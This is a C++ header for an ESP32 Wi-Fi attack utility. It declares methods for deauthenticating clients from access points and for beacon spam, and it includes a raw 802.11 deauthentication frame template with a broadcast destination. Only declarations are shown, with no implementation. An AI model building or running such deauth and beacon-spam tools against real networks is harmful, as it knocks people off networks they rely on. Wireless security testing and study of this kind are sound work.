#pragma once

#include <WiFi.h>

typedef uint8_t MacAddr[6];

class WifiAttackUtil
{
public:
  WifiAttackUtil(bool initAP = true);
  ~WifiAttackUtil();
  esp_err_t deauthenticate(const MacAddr bssid, uint8_t channel);
  esp_err_t deauthenticate(const MacAddr ap, const MacAddr bssid, uint8_t channel);
  esp_err_t beaconSpam(const char* ssid, uint8_t channel);
  esp_err_t setChannel(uint8_t channel);

private:
  int      _currentChannel  = 0;
  uint16_t _sequenceNumber  = 0;

  const uint8_t _deauthDefault[26] = {
    0xc0, 0x00,
    0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xf0, 0xff,
    0x02, 0x00
  };

  uint8_t _deauthFrame[26] = {};

  esp_err_t _changeChannel(uint8_t channel) noexcept;
  esp_err_t _sendPacket(const uint8_t* packet, size_t len) noexcept;
};